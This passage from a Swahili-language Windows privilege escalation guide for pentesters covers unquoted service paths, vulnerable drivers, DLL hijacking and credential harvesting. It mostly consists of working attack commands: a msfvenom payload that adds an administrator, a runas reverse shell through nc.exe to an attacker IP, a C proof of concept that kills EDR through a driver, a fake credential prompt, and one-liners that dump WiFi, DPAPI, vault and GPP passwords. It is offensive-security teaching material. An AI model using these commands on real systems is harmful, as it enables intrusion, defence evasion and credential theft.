wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na exploit** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kwa mkono service binary kwa metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejeshaji

Windows inaruhusu watumiaji kubainisha hatua zitakazochukuliwa ikiwa huduma itashindwa. Kipengele hiki kinaweza kusanidiwa kuonyesha binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kuwa inawezekana. Maelezo zaidi yanaweza kupatikana kwenye [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Programu

### Programu zilizowekwa

Angalia **permissions of the binaries** (labda unaweza ku-overwrite moja na escalate privileges) na **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia kama unaweza kubadilisha baadhi ya config file ili kusoma faili maalum au kama unaweza kubadilisha binary ambayo itatekelezwa na Administrator account (schedtasks).

Njia ya kutafuta ruhusa dhaifu za folda/faili kwenye mfumo ni kwa kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ inaendesha moja kwa moja DLL yoyote ya plugin chini ya saraka zake za `plugins`. Ikiwa kuna portable/copy install inayoweza kuandikwa, kuweka plugin hatarishi kunasababisha utekelezaji wa msimbo kwa automatis ndani ya `notepad++.exe` kila mara linapozinduliwa (ikiwa ni pamoja na kutoka `DllMain` na plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Endesha wakati wa kuanza

**Angalia kama unaweza kuandika tena registry au binary ambayo itatekelezwa na mtumiaji mwingine.**\
**Soma** ukurasa unaofuata ili ujifunze zaidi kuhusu maeneo ya kuvutia ya **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Madereva

Tafuta madereva ya **wa tatu yenye tabia isiyo ya kawaida/ yenye udhaifu**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ikiwa driver inaonyesha arbitrary kernel read/write primitive (ya kawaida katika IOCTL handlers zisizobuniwa vizuri), unaweza escalate kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory. Angalia mbinu hatua‑kwa‑hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kwa bugs za race-condition ambapo call iliyo na udhaifu hufungua attacker-controlled Object Manager path, kupunguza kasi ya lookup kwa makusudi (kutumia max-length components au deep directory chains) kunaweza kuongeza dirisha kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Vulnerabilities za hive za kisasa zinakuwezesha kuandaa deterministic layouts, kutumia vibaya writable HKLM/HKU descendants, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Baadhi ya signed third‑party drivers huunda device object zao na SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila bendera hii, secure DACL haitekelezwi wakati device inafunguliwa kupitia path inayojumuisha extra component, kuwaruhusu watumiaji wasio na ruhusa kupata handle kwa kutumia namespace path kama:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Mara mtumiaji anapoweza kufungua device, privileged IOCTLs zinazotolewa na driver zinaweza kutumika kwa LPE na tampering. Uwezo uliobainishwa katika mazingira ya kweli ni pamoja na:
- Kurudisha handles za ufikiaji kamili kwa processes yoyote (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Raw disk read/write isiyo na vikwazo (offline tampering, hila za persistence wakati wa boot).
- Kuutimua processes yoyote, ikijumuisha Protected Process/Light (PP/PPL), kuruhusu AV/EDR kuua kutoka user land kupitia kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mikakati ya kupunguza hatari kwa watengenezaji
- Daima weka FILE_DEVICE_SECURE_OPEN wakati wa kuunda device objects zinazotarajiwa kuzuiwa na DACL.
- Thibitisha caller context kwa privileged operations. Ongeza PP/PPL checks kabla ya kuruhusu process termination au handle returns.
- Weka vikwazo kwa IOCTLs (access masks, METHOD_*, input validation) na fikiria brokered models badala ya direct kernel privileges.

Mawazo ya utambuzi kwa watetezi
- Fuatilia user-mode opens za majina ya device yanayoshukuwa (e.g., \\ .\\amsdk*) na mfululizo maalum wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na zilishe orodha zako za allow/deny.

## PATH DLL Hijacking

If you have **idhinishwa za kuandika ndani ya folda iliyopo kwenye PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Kagua ruhusa za folda zote zilizopo ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia ukaguzi huu vibaya:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Mtandao

### Folda zilizoshirikiwa
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana hardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Miunganisho ya Mtandao & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari wazi

Angalia kwa ajili ya **huduma zilizozuiliwa** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Routing
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Sheria za Firewall

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, tengeneza sheria, zima, zima...)**

Zaidi[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Faili ya binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ikiwa unapata root user, unaweza kusikiliza kwenye port yoyote (kwa mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, itakuuliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, unaweza jaribu `--default-user root`

Unaweza kuchunguza filesystem ya `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Nyaraka za Windows

### Nyaraka za Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Meneja wa sifa za mtumiaji / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault huhifadhi sifa za watumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** zinaweza **kuingia watumiaji moja kwa moja**y. Mwanzoni, inaweza kuonekana kwamba watumiaji wanaweza kuhifadhi sifa zao za Facebook, Twitter, Gmail n.k., ili wajinge moja kwa moja kupitia vivinjari. Lakini si hivyo.

Windows Vault huhifadhi sifa ambazo Windows inaweza kuingia kwa watumiaji moja kwa moja, ambayo ina maana kwamba programu yoyote **Windows application inayohitaji sifa ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager hii** & Windows Vault na kutumia sifa zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nywila kila wakati.

Isipokuwa programu hizo zinaingiliana na Credential Manager, sidhani kuwa zinaweza kutumia sifa hizo kwa rasilimali fulani. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba sifa za rasilimali hiyo** kutoka kwa vault ya uhifadhi chaguo-msingi.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` kwa chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita remote binary kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya credential iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** provides a method for symmetric encryption of data, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. This encryption leverages a user or system secret to significantly contribute to entropy.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. In scenarios involving system encryption, it utilizes the system's domain authentication secrets.

Encrypted user RSA keys, by using DPAPI, are stored in the `%APPDATA%\Microsoft\Protect\{SID}` directory, where `{SID}` represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, typically consists of 64 bytes of random data. (It's important to note that access to this directory is restricted, preventing listing its contents via the `dir` command in CMD, though it can be listed through PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` na hoja zinazofaa (`/pvk` au `/rpc`) ili ku-decrypt.

Faili za **credentials protected by the master password** kwa kawaida ziko katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` kwa `/masterkey` inayofaa ili ku-decrypt.\
Unaweza **kutoa nyingi za DPAPI** **masterkeys** kutoka **memory** kwa kutumia module `sekurlsa::dpapi` (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** hutumika mara kwa mara kwa kazi za **scripting** na automation kama njia ya kuhifadhi credentials zilizofichwa kwa urahisi. Credentials zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida inamaanisha zinaweza tu ku-decryptwa na mtumiaji mmoja huyo kwenye kompyuta ile ile zilipotengenezwa.

Ili **decrypt** PS credentials kutoka kwenye faili inayoiweka unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ 
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Cheti za Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia **Mimikatz** `dpapi::rdg` module na `/masterkey` inayofaa ili **kufungua (decrypt) faili yoyote ya .rdg**\
Unaweza **kutoa (extract) masterkeys nyingi za DPAPI** kutoka kwenye kumbukumbu kwa kutumia Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Watu mara nyingi hutumia app ya StickyNotes kwenye workstations za Windows kuhifadhi **nywila** na taarifa nyingine, bila kujua kuwa ni faili la database. Faili hii iko katika `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na inafaa kila wakati kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kwamba ili kurejesha nywila kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha chini ya High Integrity level.**\
**AppCmd.exe** iko katika `%systemroot%\system32\inetsrv\` directory.\
Ikiwa faili hii ipo basi kuna uwezekano kwamba baadhi ya **credentials** zimewekwa na zinaweza **kurejeshwa**.

Msimbo huu umetolewa kutoka kwa [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` inapatikana .\
Wasakinishaji huendeshwa kwa **SYSTEM privileges**, wengi ni dhaifu kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Rejista (Sifa za kuingia)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna kitu chochote cha kuvutia huko:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ikiwa utapata kipengee chochote ndani ya njia hiyo kuna uwezekano ni ufunguo wa SSH uliohifadhiwa. Ufunguo huo umesimbwa lakini unaweza kufunguliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Kama huduma ya `ssh-agent` haijaendeshwa na unataka ianze moja kwa moja wakati wa boot, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziweka kwa `ssh-add` na kuingia kwa ssh kwenye mashine. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon hakutambua matumizi ya `dpapi.dll` wakati wa asymmetric key authentication.

### Faili zisizofuatiliwa
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta mafaili haya ukitumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa yaliyomo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM nakala za chelezo
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vyeti vya Wingu
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili liitwalo **SiteList.xml**

### Nywila za GPP zilizohifadhiwa

Kipengele kilikuwepo hapo awali kilichoruhusu utumaji wa akaunti za administrator wa ndani zilizobinafsishwa kwenye kundi la mashine kwa kutumia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na kasoro kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizo hifadhiwa kama mafaili ya XML ndani ya SYSVOL, zinaweza kupatikana na mtumiaji yeyote wa domain. Pili, nywila ndani ya GPP hizi, zilizofichwa kwa AES256 kwa kutumia default key iliyoelezwa hadharani, zinaweza kufunguliwa (decrypted) na mtumiaji yeyote aliyethibitishwa. Hii ilileta hatari kubwa, kwani inaweza kumruhusu mtumiaji kupata viwango vya juu vya ruhusa.

Ili kupunguza hatari hii, function ilitengenezwa kuvinjari mafaili ya GPP yaliyohifadhiwa kwa ndani ambayo yana uwanja wa "cpassword" usio tupu. Baada ya kupata faili kama hilo, function inadecrypt nywila na kurudisha PowerShell object maalum. Object hii inajumuisha maelezo kuhusu GPP na eneo la faili, ikiisaidia kutambua na kurekebisha udhaifu huu wa usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ kwa mafaili haya:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili ku-decrypt cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec ili kupata passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config yenye credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN maelezo ya kuingia
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Rekodi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kuomba credentials

Unaweza kila wakati **kuomba mtumiaji aingize credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (kumbuka kwamba **kuuliza** mteja moja kwa moja kwa **credentials** ni kweli **hatari**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana ambazo wakati fulani zilikuwa na **passwords** katika **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
